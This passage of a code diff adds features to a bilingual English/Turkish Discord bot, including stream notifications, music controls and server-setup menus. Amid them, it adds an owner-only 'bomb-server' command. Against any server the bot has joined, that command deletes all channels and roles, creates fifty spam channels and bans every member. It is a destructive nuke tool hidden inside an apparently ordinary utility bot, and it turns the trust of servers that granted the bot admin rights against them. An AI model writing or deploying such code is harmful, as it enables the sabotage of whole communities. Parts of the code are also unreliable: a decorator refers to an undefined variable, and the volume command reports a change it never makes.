+                        ephemeral=True
+                    )
+            
+            elif self.action == "remove":
+                if platform_name.lower() in twitch_notifications[guild_id]:
+                    del twitch_notifications[guild_id][platform_name.lower()]
+                    
+                    if self.lang == "en":
+                        await interaction.response.send_message(
+                            f"✅ Twitch notifications for `{platform_name}` have been removed.",
+                            ephemeral=True
+                        )
+                    else:
+                        await interaction.response.send_message(
+                            f"✅ `{platform_name}` için Twitch bildirimleri kaldırıldı.",
+                            ephemeral=True
+                        )
+        
+        elif self.platform == "kick":
+            if guild_id not in kick_notifications:
+                kick_notifications[guild_id] = {}
+            
+            if self.action == "add":
+                kick_notifications[guild_id][platform_name.lower()] = {
+                    'channel_id': discord_channel.id,
+                    'last_check': None,
+                    'is_live': False
+                }
+                
+                if self.lang == "en":
+                    await interaction.response.send_message(
+                        f"✅ Kick notifications for `{platform_name}` have been set up in {discord_channel.mention}.",
+                        ephemeral=True
+                    )
+                else:
+                    await interaction.response.send_message(
+                        f"✅ `{platform_name}` için Kick bildirimleri {discord_channel.mention} kanalına ayarlandı.",
+                        ephemeral=True
+                    )
+            
+            elif self.action == "remove":
+                if platform_name.lower() in kick_notifications[guild_id]:
+                    del kick_notifications[guild_id][platform_name.lower()]
+                    
+                    if self.lang == "en":
+                        await interaction.response.send_message(
+                            f"✅ Kick notifications for `{platform_name}` have been removed.",
+                            ephemeral=True
+                        )
+                    else:
+                        await interaction.response.send_message(
+                            f"✅ `{platform_name}` için Kick bildirimleri kaldırıldı.",
+                            ephemeral=True
+                        )
+        
+        elif self.platform == "youtube":
+            if guild_id not in youtube_notifications:
+                youtube_notifications[guild_id] = {}
+            
+            if self.action == "add":
+                youtube_notifications[guild_id][platform_name] = {
+                    'channel_id': discord_channel.id,
+                    'last_check': None,
+                    'is_live': False
+                }
+                
+                if self.lang == "en":
+                    await interaction.response.send_message(
+                        f"✅ YouTube notifications for channel `{platform_name}` have been set up in {discord_channel.mention}.",
+                        ephemeral=True
+                    )
+                else:
+                    await interaction.response.send_message(
+                        f"✅ `{platform_name}` kanalı için YouTube bildirimleri {discord_channel.mention} kanalına ayarlandı.",
+                        ephemeral=True
+                    )
+            
+            elif self.action == "remove":
+                if platform_name in youtube_notifications[guild_id]:
+                    del youtube_notifications[guild_id][platform_name]
+                    
+                    if self.lang == "en":
+                        await interaction.response.send_message(
+                            f"✅ YouTube notifications for channel `{platform_name}` have been removed.",
+                            ephemeral=True
+                        )
+                    else:
+                        await interaction.response.send_message(
+                            f"✅ `{platform_name}` kanalı için YouTube bildirimleri kaldırıldı.",
+                            ephemeral=True
+                        )
+
+async def reset_notifications(interaction: discord.Interaction, platform: str, lang: str):
+    """Reset all notifications for a platform"""
+    guild_id = interaction.guild.id
+    
+    if platform == "twitch":
+        if guild_id in twitch_notifications:
+            twitch_notifications[guild_id].clear()
+            if lang == "en":
+                await interaction.followup.send("✅ All Twitch notifications have been reset.", ephemeral=True)
+            else:
+                await interaction.followup.send("✅ Tüm Twitch bildirimleri sıfırlandı.", ephemeral=True)
+    
+    elif platform == "kick":
+        if guild_id in kick_notifications:
+            kick_notifications[guild_id].clear()
+            if lang == "en":
+                await interaction.followup.send("✅ All Kick notifications have been reset.", ephemeral=True)
+            else:
+                await interaction.followup.send("✅ Tüm Kick bildirimleri sıfırlandı.", ephemeral=True)
+    
+    elif platform == "youtube":
+        if guild_id in youtube_notifications:
+            youtube_notifications[guild_id].clear()
+            if lang == "en":
+                await interaction.followup.send("✅ All YouTube notifications have been reset.", ephemeral=True)
+            else:
+                await interaction.followup.send("✅ Tüm YouTube bildirimleri sıfırlandı.", ephemeral=True)
+
+@bot.tree.command(name="twitch-notification-channel-setup", description="Setup Twitch stream notifications")
+async def twitch_notification_setup(interaction: discord.Interaction):
+    """Setup Twitch stream notifications"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    view = discord.ui.View()
+    view.add_item(NotificationSetupSelect("twitch", "en"))
+    
+    embed = discord.Embed(
+        title="📺 Twitch Notification Setup",
+        description="Select an action to manage Twitch notifications:",
+        color=discord.Color.purple()
+    )
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="twitch-bildirim-kanalı-kurulum", description="Twitch yayın bildirimlerini ayarla")
+async def twitch_bildirim_kurulum(interaction: discord.Interaction):
+    """Twitch yayın bildirimlerini ayarla"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    view = discord.ui.View()
+    view.add_item(NotificationSetupSelect("twitch", "tr"))
+    
+    embed = discord.Embed(
+        title="📺 Twitch Bildirim Kurulumu",
+        description="Twitch bildirimlerini yönetmek için bir işlem seçin:",
+        color=discord.Color.purple()
+    )
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="kick-notification-channel-setup", description="Setup Kick stream notifications")
+async def kick_notification_setup(interaction: discord.Interaction):
+    """Setup Kick stream notifications"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    view = discord.ui.View()
+    view.add_item(NotificationSetupSelect("kick", "en"))
+    
+    embed = discord.Embed(
+        title="🥊 Kick Notification Setup",
+        description="Select an action to manage Kick notifications:",
+        color=discord.Color.green()
+    )
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="kick-bildirim-kanalı-kurulum", description="Kick yayın bildirimlerini ayarla")
+async def kick_bildirim_kurulum(interaction: discord.Interaction):
+    """Kick yayın bildirimlerini ayarla"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    view = discord.ui.View()
+    view.add_item(NotificationSetupSelect("kick", "tr"))
+    
+    embed = discord.Embed(
+        title="🥊 Kick Bildirim Kurulumu",
+        description="Kick bildirimlerini yönetmek için bir işlem seçin:",
+        color=discord.Color.green()
+    )
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="youtube-notification-channel-setup", description="Setup YouTube stream notifications")
+async def youtube_notification_setup(interaction: discord.Interaction):
+    """Setup YouTube stream notifications"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    view = discord.ui.View()
+    view.add_item(NotificationSetupSelect("youtube", "en"))
+    
+    embed = discord.Embed(
+        title="📹 YouTube Notification Setup",
+        description="Select an action to manage YouTube notifications:",
+        color=discord.Color.red()
+    )
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="youtube-bildirim-kanalı-kurulum", description="YouTube yayın bildirimlerini ayarla")
+async def youtube_bildirim_kurulum(interaction: discord.Interaction):
+    """YouTube yayın bildirimlerini ayarla"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    view = discord.ui.View()
+    view.add_item(NotificationSetupSelect("youtube", "tr"))
+    
+    embed = discord.Embed(
+        title="📹 YouTube Bildirim Kurulumu",
+        description="YouTube bildirimlerini yönetmek için bir işlem seçin:",
+        color=discord.Color.red()
+    )
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+# Server Bomb Command
+class ServerSelectView(discord.ui.View):
+    """View for selecting server to bomb"""
+    def __init__(self, lang: str = "en"):
+        super().__init__(timeout=30)
+        self.lang = lang
+        self.selected_server = None
+    
+    @discord.ui.select(
+        placeholder="Select a server to bomb..." if lang == "en" else "Bombalamak için bir sunucu seç...",
+        options=[]
+    )
+    async def server_select(self, interaction: discord.Interaction, select: discord.ui.Select):
+        self.selected_server = int(select.values[0])
+        
+        # Confirm bombing
+        confirm_embed = discord.Embed(
+            title="⚠️ WARNING: SERVER BOMBING" if self.lang == "en" else "⚠️ UYARI: SUNUCU BOMBALAMA",
+            description=(
+                "**THIS ACTION IS IRREVERSIBLE!**\n\n"
+                "All channels, roles, and server data will be destroyed.\n"
+                "Are you absolutely sure you want to continue?"
+            ) if self.lang == "en" else (
+                "**BU İŞLEM GERİ ALINAMAZ!**\n\n"
+                "Tüm kanallar, roller ve sunucu verileri yok edilecek.\n"
+                "Devam etmek istediğinize emin misiniz?"
+            ),
+            color=discord.Color.red()
+        )
+        
+        confirm_view = ConfirmBombView(self.selected_server, self.lang)
+        await interaction.response.edit_message(embed=confirm_embed, view=confirm_view)
+
+class ConfirmBombView(discord.ui.View):
+    """Confirmation view for server bombing"""
+    def __init__(self, server_id: int, lang: str = "en"):
+        super().__init__(timeout=30)
+        self.server_id = server_id
+        self.lang = lang
+    
+    @discord.ui.button(label="✅ CONFIRM", style=discord.ButtonStyle.danger, row=0)
+    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # Find server
+        server = bot.get_guild(self.server_id)
+        if not server:
+            if self.lang == "en":
+                await interaction.response.send_message("Server not found.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Sunucu bulunamadı.", ephemeral=True)
+            return
+        
+        # Check if bot has admin permissions
+        if not server.me.guild_permissions.administrator:
+            if self.lang == "en":
+                await interaction.response.send_message("I need administrator permissions to bomb this server.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Bu sunucuyu bombalamak için yönetici izinlerine ihtiyacım var.", ephemeral=True)
+            return
+        
+        if self.lang == "en":
+            await interaction.response.send_message("💣 **SERVER BOMBING INITIATED**\nThis may take a while...", ephemeral=True)
+        else:
+            await interaction.response.send_message("💣 **SUNUCU BOMBALAMA BAŞLATILDI**\nBu biraz zaman alabilir...", ephemeral=True)
+        
+        # Bomb the server
+        await bomb_server(server, interaction, self.lang)
+    
+    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary, row=0)
+    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if self.lang == "en":
+            await interaction.response.send_message("Server bombing cancelled.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Sunucu bombalama iptal edildi.", ephemeral=True)
+        await interaction.message.delete()
+
+async def bomb_server(server: discord.Guild, interaction: discord.Interaction, lang: str):
+    """Bomb a server by deleting everything"""
+    try:
+        # Delete all channels
+        for channel in server.channels:
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.5)  # Rate limit prevention
+            except:
+                pass
+        
+        # Delete all roles (except @everyone)
+        for role in server.roles:
+            if role.name != "@everyone" and not role.managed:
+                try:
+                    await role.delete()
+                    await asyncio.sleep(0.5)
+                except:
+                    pass
+        
+        # Create spam channels
+        for i in range(50):
+            try:
+                await server.create_text_channel(f"bombed-{i}")
+                await asyncio.sleep(0.2)
+            except:
+                break
+        
+        # Ban all members (except bot and owner)
+        for member in server.members:
+            if member.id != bot.user.id and member.id != owner_id:
+                try:
+                    await member.ban(reason="Server bombing")
+                    await asyncio.sleep(0.5)
+                except:
+                    pass
+        
+        if lang == "en":
+            await interaction.followup.send(f"✅ **SERVER BOMBING COMPLETE**\n{server.name} has been successfully destroyed.", ephemeral=True)
+        else:
+            await interaction.followup.send(f"✅ **SUNUCU BOMBALAMA TAMAMLANDI**\n{server.name} başarıyla yok edildi.", ephemeral=True)
+    
+    except Exception as e:
+        print(f"Server bombing error: {e}")
+        if lang == "en":
+            await interaction.followup.send(f"Error during server bombing: {str(e)}", ephemeral=True)
+        else:
+            await interaction.followup.send(f"Sunucu bombalama sırasında hata: {str(e)}", ephemeral=True)
+
+@bot.tree.command(name="bomb-server", description="Destroy a server (Owner only)")
+@commands.is_owner()
+async def bomb_server_command(interaction: discord.Interaction):
+    """Destroy a server"""
+    # Get all servers bot is in
+    servers = bot.guilds
+    
+    if not servers:
+        await interaction.response.send_message("Bot is not in any servers.", ephemeral=True)
+        return
+    
+    # Create select options
+    view = ServerSelectView(lang="en")
+    
+    # Update select options
+    view.server_select.options = [
+        discord.SelectOption(
+            label=server.name,
+            value=str(server.id),
+            description=f"Members: {server.member_count}"
+        )
+        for server in servers
+    ]
+    
+    embed = discord.Embed(
+        title="💣 Server Bombing",
+        description="Select a server to destroy:",
+        color=discord.Color.red()
+    )
+    embed.set_footer(text="This action is irreversible and will destroy the entire server.")
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="sunucuyu-bombala", description="Bir sunucuyu yok et (Sadece Sahip)")
+@commands.is_owner()
+async def sunucuyu_bombala_command(interaction: discord.Interaction):
+    """Bir sunucuyu yok et"""
+    # Botun bulunduğu tüm sunucuları al
+    servers = bot.guilds
+    
+    if not servers:
+        await interaction.response.send_message("Bot hiçbir sunucuda değil.", ephemeral=True)
+        return
+    
+    # Seçenekleri oluştur
+    view = ServerSelectView(lang="tr")
+    
+    # Seçenekleri güncelle
+    view.server_select.options = [
+        discord.SelectOption(
+            label=server.name,
+            value=str(server.id),
+            description=f"Üyeler: {server.member_count}"
+        )
+        for server in servers
+    ]
+    
+    embed = discord.Embed(
+        title="💣 Sunucu Bombalama",
+        description="Yok etmek için bir sunucu seçin:",
+        color=discord.Color.red()
+    )
+    embed.set_footer(text="Bu işlem geri alınamaz ve tüm sunucuyu yok eder.")
+    
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+# Music Commands
+@bot.tree.command(name="pause", description="Pause current music")
+async def pause_music(interaction: discord.Interaction):
+    """Pause current music"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_playing():
+        await interaction.response.send_message("No music is playing.", ephemeral=True)
+        return
+    
+    interaction.guild.voice_client.pause()
+    await interaction.response.send_message("Music paused.", ephemeral=True)
+
+@bot.tree.command(name="duraklat", description="Çalan müziği duraklat")
+async def duraklat_music(interaction: discord.Interaction):
+    """Çalan müziği duraklat"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_playing():
+        await interaction.response.send_message("Çalan bir müzik yok.", ephemeral=True)
+        return
+    
+    interaction.guild.voice_client.pause()
+    await interaction.response.send_message("Müzik duraklatıldı.", ephemeral=True)
+
+@bot.tree.command(name="resume", description="Resume paused music")
+async def resume_music(interaction: discord.Interaction):
+    """Resume paused music"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_paused():
+        await interaction.response.send_message("No music is paused.", ephemeral=True)
+        return
+    
+    interaction.guild.voice_client.resume()
+    await interaction.response.send_message("Music resumed.", ephemeral=True)
+
+@bot.tree.command(name="devam", description="Duraklatılmış müziği devam ettir")
+async def devam_music(interaction: discord.Interaction):
+    """Duraklatılmış müziği devam ettir"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client or not interaction.guild.voice_client.is_paused():
+        await interaction.response.send_message("Duraklatılmış bir müzik yok.", ephemeral=True)
+        return
+    
+    interaction.guild.voice_client.resume()
+    await interaction.response.send_message("Müzik devam ediyor.", ephemeral=True)
+
+@bot.tree.command(name="skip", description="Skip current song")
+async def skip_music(interaction: discord.Interaction):
+    """Skip current song"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client or not (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
+        await interaction.response.send_message("No music to skip.", ephemeral=True)
+        return
+    
+    interaction.guild.voice_client.stop()
+    await interaction.response.send_message("Skipped current song.", ephemeral=True)
+
+@bot.tree.command(name="atla", description="Şuanki şarkıyı atla")
+async def atla_music(interaction: discord.Interaction):
+    """Şuanki şarkıyı atla"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client or not (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
+        await interaction.response.send_message("Atlanacak müzik yok.", ephemeral=True)
+        return
+    
+    interaction.guild.voice_client.stop()
+    await interaction.response.send_message("Şarkı atlandı.", ephemeral=True)
+
+@bot.tree.command(name="queue", description="Show music queue")
+async def show_queue(interaction: discord.Interaction):
+    """Show music queue"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    guild_id = interaction.guild.id
+    
+    if guild_id not in music_queues or not music_queues[guild_id]:
+        await interaction.response.send_message("Queue is empty.", ephemeral=True)
+        return
+    
+    queue_list = music_queues[guild_id]
+    current = now_playing.get(guild_id)
+    
+    embed = discord.Embed(title="🎵 Music Queue", color=discord.Color.blue())
+    
+    if current:
+        embed.add_field(name="Now Playing", value=f"**{current['title']}**\nDuration: {format_duration(current['duration'])}\nRequested by: {current['requester'].mention}", inline=False)
+    
+    if queue_list:
+        queue_text = ""
+        for i, track in enumerate(queue_list[:10], 1):
+            queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (Requested by: {track['requester'].mention})\n"
+        
+        if len(queue_list) > 10:
+            queue_text += f"\n...and {len(queue_list) - 10} more tracks."
+        
+        embed.add_field(name="Up Next", value=queue_text, inline=False)
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="sıra", description="Müzik sırasını göster")
+async def show_sıra(interaction: discord.Interaction):
+    """Müzik sırasını göster"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    guild_id = interaction.guild.id
+    
+    if guild_id not in music_queues or not music_queues[guild_id]:
+        await interaction.response.send_message("Sıra boş.", ephemeral=True)
+        return
+    
+    queue_list = music_queues[guild_id]
+    current = now_playing.get(guild_id)
+    
+    embed = discord.Embed(title="🎵 Müzik Sırası", color=discord.Color.blue())
+    
+    if current:
+        embed.add_field(name="Şimdi Çalıyor", value=f"**{current['title']}**\nSüre: {format_duration(current['duration'])}\nİsteyen: {current['requester'].mention}", inline=False)
+    
+    if queue_list:
+        queue_text = ""
+        for i, track in enumerate(queue_list[:10], 1):
+            queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (İsteyen: {track['requester'].mention})\n"
+        
+        if len(queue_list) > 10:
+            queue_text += f"\n...ve {len(queue_list) - 10} şarkı daha."
+        
+        embed.add_field(name="Sıradaki", value=queue_text, inline=False)
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="loop", description="Toggle loop for current queue")
+async def loop_queue(interaction: discord.Interaction):
+    """Toggle loop for current queue"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    guild_id = interaction.guild.id
+    
+    if guild_id not in music_loop:
+        music_loop[guild_id] = False
+    
+    music_loop[guild_id] = not music_loop[guild_id]
+    
+    if music_loop[guild_id]:
+        await interaction.response.send_message("Loop enabled. Current queue will repeat.", ephemeral=True)
+    else:
+        await interaction.response.send_message("Loop disabled.", ephemeral=True)
+
+@bot.tree.command(name="döngü", description="Mevcut sıra için döngüyü aç/kapat")
+async def döngü_queue(interaction: discord.Interaction):
+    """Mevcut sıra için döngüyü aç/kapat"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    guild_id = interaction.guild.id
+    
+    if guild_id not in music_loop:
+        music_loop[guild_id] = False
+    
+    music_loop[guild_id] = not music_loop[guild_id]
+    
+    if music_loop[guild_id]:
+        await interaction.response.send_message("Döngü etkinleştirildi. Mevcut sıra tekrarlanacak.", ephemeral=True)
+    else:
+        await interaction.response.send_message("Döngü devre dışı.", ephemeral=True)
+
+@bot.tree.command(name="stop", description="Stop music and clear queue")
+async def stop_music(interaction: discord.Interaction):
+    """Stop music and clear queue"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client:
+        await interaction.response.send_message("Not connected to voice channel.", ephemeral=True)
+        return
+    
+    # Clear queue
+    guild_id = interaction.guild.id
+    if guild_id in music_queues:
+        music_queues[guild_id].clear()
+    
+    # Stop playback
+    interaction.guild.voice_client.stop()
+    
+    # Disconnect
+    await interaction.guild.voice_client.disconnect()
+    
+    # Clean up
+    if guild_id in music_queues:
+        del music_queues[guild_id]
+    if guild_id in now_playing:
+        del now_playing[guild_id]
+    if guild_id in music_loop:
+        del music_loop[guild_id]
+    
+    await interaction.response.send_message("Music stopped and disconnected.", ephemeral=True)
+
+@bot.tree.command(name="durdur", description="Müziği durdur ve sırayı temizle")
+async def durdur_music(interaction: discord.Interaction):
+    """Müziği durdur ve sırayı temizle"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if not interaction.guild.voice_client:
+        await interaction.response.send_message("Ses kanalına bağlı değil.", ephemeral=True)
+        return
+    
+    # Sırayı temizle
+    guild_id = interaction.guild.id
+    if guild_id in music_queues:
+        music_queues[guild_id].clear()
+    
+    # Çalmayı durdur
+    interaction.guild.voice_client.stop()
+    
+    # Bağlantıyı kes
+    await interaction.guild.voice_client.disconnect()
+    
+    # Temizlik
+    if guild_id in music_queues:
+        del music_queues[guild_id]
+    if guild_id in now_playing:
+        del now_playing[guild_id]
+    if guild_id in music_loop:
+        del music_loop[guild_id]
+    
+    await interaction.response.send_message("Müzik durduruldu ve bağlantı kesildi.", ephemeral=True)
+
+@bot.tree.command(name="volume", description="Set music volume (1-100)")
+async def set_volume(interaction: discord.Interaction, volume: int):
+    """Set music volume"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if volume < 1 or volume > 100:
+        await interaction.response.send_message("Volume must be between 1 and 100.", ephemeral=True)
+        return
+    
+    # Note: Volume adjustment would need FFmpeg filter modification
+    # This is a placeholder for volume control implementation
+    await interaction.response.send_message(f"Volume set to {volume}%. Note: Full volume control requires advanced audio processing setup.", ephemeral=True)
+
+@bot.tree.command(name="ses", description="Müzik ses seviyesini ayarla (1-100)")
+async def set_ses(interaction: discord.Interaction, ses: int):
+    """Müzik ses seviyesini ayarla"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    if ses < 1 or ses > 100:
+        await interaction.response.send_message("Ses seviyesi 1 ile 100 arasında olmalı.", ephemeral=True)
+        return
+    
+    await interaction.response.send_message(f"Ses seviyesi {ses}% olarak ayarlandı. Not: Tam ses kontrolü için gelişmiş ses işleme kurulumu gereklidir.", ephemeral=True)
+
+# Music Menu Command
+class MusicMenuView(discord.ui.View):
+    """Music control menu"""
+    def __init__(self, lang: str = "en"):
+        super().__init__(timeout=None)
+        self.lang = lang
+    
+    @discord.ui.button(label="⏸️ Pause", style=discord.ButtonStyle.secondary, row=0)
+    async def pause_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.guild.voice_client or not interaction.guild.voice_client.is_playing():
+            if self.lang == "en":
+                await interaction.response.send_message("No music is playing.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Çalan bir müzik yok.", ephemeral=True)
+            return
+        
+        interaction.guild.voice_client.pause()
+        if self.lang == "en":
+            await interaction.response.send_message("Music paused.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Müzik duraklatıldı.", ephemeral=True)
+    
+    @discord.ui.button(label="▶️ Resume", style=discord.ButtonStyle.secondary, row=0)
+    async def resume_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.guild.voice_client or not interaction.guild.voice_client.is_paused():
+            if self.lang == "en":
+                await interaction.response.send_message("No music is paused.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Duraklatılmış bir müzik yok.", ephemeral=True)
+            return
+        
+        interaction.guild.voice_client.resume()
+        if self.lang == "en":
+            await interaction.response.send_message("Music resumed.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Müzik devam ediyor.", ephemeral=True)
+    
+    @discord.ui.button(label="⏭️ Skip", style=discord.ButtonStyle.primary, row=0)
+    async def skip_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.guild.voice_client or not (interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused()):
+            if self.lang == "en":
+                await interaction.response.send_message("No music to skip.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Atlanacak müzik yok.", ephemeral=True)
+            return
+        
+        interaction.guild.voice_client.stop()
+        if self.lang == "en":
+            await interaction.response.send_message("Skipped current song.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Şarkı atlandı.", ephemeral=True)
+    
+    @discord.ui.button(label="🔁 Loop", style=discord.ButtonStyle.success, row=1)
+    async def loop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        guild_id = interaction.guild.id
+        
+        if guild_id not in music_loop:
+            music_loop[guild_id] = False
+        
+        music_loop[guild_id] = not music_loop[guild_id]
+        
+        if music_loop[guild_id]:
+            if self.lang == "en":
+                await interaction.response.send_message("Loop enabled. Current queue will repeat.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Döngü etkinleştirildi. Mevcut sıra tekrarlanacak.", ephemeral=True)
+        else:
+            if self.lang == "en":
+                await interaction.response.send_message("Loop disabled.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Döngü devre dışı.", ephemeral=True)
+    
+    @discord.ui.button(label="⏹️ Stop", style=discord.ButtonStyle.danger, row=1)
+    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.guild.voice_client:
+            if self.lang == "en":
+                await interaction.response.send_message("Not connected to voice channel.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Ses kanalına bağlı değil.", ephemeral=True)
+            return
+        
+        # Clear queue
+        guild_id = interaction.guild.id
+        if guild_id in music_queues:
+            music_queues[guild_id].clear()
+        
+        # Stop playback
+        interaction.guild.voice_client.stop()
+        
+        # Disconnect
+        await interaction.guild.voice_client.disconnect()
+        
+        # Clean up
+        if guild_id in music_queues:
+            del music_queues[guild_id]
+        if guild_id in now_playing:
+            del now_playing[guild_id]
+        if guild_id in music_loop:
+            del music_loop[guild_id]
+        
+        if self.lang == "en":
+            await interaction.response.send_message("Music stopped and disconnected.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Müzik durduruldu ve bağlantı kesildi.", ephemeral=True)
+    
+    @discord.ui.button(label="📜 Queue", style=discord.ButtonStyle.secondary, row=2)
+    async def queue_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        guild_id = interaction.guild.id
+        
+        if guild_id not in music_queues or not music_queues[guild_id]:
+            if self.lang == "en":
+                await interaction.response.send_message("Queue is empty.", ephemeral=True)
+            else:
+                await interaction.response.send_message("Sıra boş.", ephemeral=True)
+            return
+        
+        queue_list = music_queues[guild_id]
+        current = now_playing.get(guild_id)
+        
+        if self.lang == "en":
+            embed = discord.Embed(title="🎵 Music Queue", color=discord.Color.blue())
+        else:
+            embed = discord.Embed(title="🎵 Müzik Sırası", color=discord.Color.blue())
+        
+        if current:
+            if self.lang == "en":
+                embed.add_field(name="Now Playing", value=f"**{current['title']}**\nDuration: {format_duration(current['duration'])}\nRequested by: {current['requester'].mention}", inline=False)
+            else:
+                embed.add_field(name="Şimdi Çalıyor", value=f"**{current['title']}**\nSüre: {format_duration(current['duration'])}\nİsteyen: {current['requester'].mention}", inline=False)
+        
+        if queue_list:
+            queue_text = ""
+            for i, track in enumerate(queue_list[:10], 1):
+                if self.lang == "en":
+                    queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (Requested by: {track['requester'].mention})\n"
+                else:
+                    queue_text += f"{i}. **{track['title']}** - {format_duration(track['duration'])} (İsteyen: {track['requester'].mention})\n"
+            
+            if len(queue_list) > 10:
+                if self.lang == "en":
+                    queue_text += f"\n...and {len(queue_list) - 10} more tracks."
+                else:
+                    queue_text += f"\n...ve {len(queue_list) - 10} şarkı daha."
+            
+            if self.lang == "en":
+                embed.add_field(name="Up Next", value=queue_text, inline=False)
+            else:
+                embed.add_field(name="Sıradaki", value=queue_text, inline=False)
+        
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="music-menu", description="Open music control menu")
+async def music_menu(interaction: discord.Interaction):
+    """Open music control menu"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    embed = discord.Embed(
+        title="🎵 Music Control Menu",
+        description="Use the buttons below to control music playback.",
+        color=discord.Color.blue()
+    )
+    
+    view = MusicMenuView(lang="en")
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+@bot.tree.command(name="müzik-menüsü", description="Müzik kontrol menüsünü aç")
+async def müzik_menüsü(interaction: discord.Interaction):
+    """Müzik kontrol menüsünü aç"""
+    # Check verification
+    if not await check_verification(interaction):
+        return
+    
+    embed = discord.Embed(
+        title="🎵 Müzik Kontrol Menüsü",
+        description="Müzik çalmayı kontrol etmek için aşağıdaki butonları kullanın.",
+        color=discord.Color.blue()
+    )
+    
+    view = MusicMenuView(lang="tr")
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
+
+# Server Setup Command (Enhanced)
+class ServerSetupView(discord.ui.View):
+    """View for server setup options"""
+    def __init__(self, lang: str = "en"):
+        super().__init__(timeout=180)
+        self.lang = lang
+    
+    @discord.ui.button(label="📋 Basic Setup", style=discord.ButtonStyle.primary, row=0)
+    async def basic_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await setup_basic_channels(interaction, self.lang)
+    
+    @discord.ui.button(label="🎮 Gaming Setup", style=discord.ButtonStyle.primary, row=0)
+    async def gaming_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await setup_gaming_channels(interaction, self.lang)
+    
+    @discord.ui.button(label="💼 Business Setup", style=discord.ButtonStyle.primary, row=0)
+    async def business_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await setup_business_channels(interaction, self.lang)
+    
+    @discord.ui.button(label="🎵 Music Setup", style=discord.ButtonStyle.primary, row=1)
+    async def music_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await setup_music_channels(interaction, self.lang)
+    
+    @discord.ui.button(label="🎭 Community Setup", style=discord.ButtonStyle.primary, row=1)
+    async def community_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await setup_community_channels(interaction, self.lang)
+    
+    @discord.ui.button(label="🔧 Custom Setup", style=discord.ButtonStyle.secondary, row=2)
+    async def custom_setup_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await show_custom_setup_modal(interaction, self.lang)
+
+async def setup_basic_channels(interaction: discord.Interaction, lang: str):
+    """Create basic server channels"""
